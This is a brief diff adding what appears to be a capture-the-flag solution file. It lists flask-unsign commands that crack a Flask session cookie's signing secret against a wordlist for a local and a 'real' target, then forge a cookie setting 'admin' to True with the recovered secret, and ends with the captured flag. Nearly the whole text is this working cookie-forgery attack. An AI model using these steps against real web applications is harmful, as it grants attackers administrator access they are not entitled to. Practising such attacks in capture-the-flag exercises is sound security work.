@@ -1,0 +1,7 @@
+# Local
+flask-unsign --unsign --wordlist wordlist_local.txt --cookie 'eyJhZG1pbiI6ZmFsc2UsInVpZCI6InNhbSJ9.Y8I9qg.36BC8FyKgRt0ZQTwRNJI7ocB-Pc'
+
+# Real
+flask-unsign --unsign --wordlist wordlist_real.txt --cookie 'eyJhZG1pbiI6bnVsbCwidWlkIjoic2FtIn0.Y8I8yQ._NvxIydkmk184xuvNaEv2TzOFJc'
+flask-unsign --sign --cookie "{'admin': True, 'uid': 'sam'}" --secret "84787d274d6b7e03d94ce2dcbfe85bf1"
+idek{s1mpl3_expl01t_s3rver}
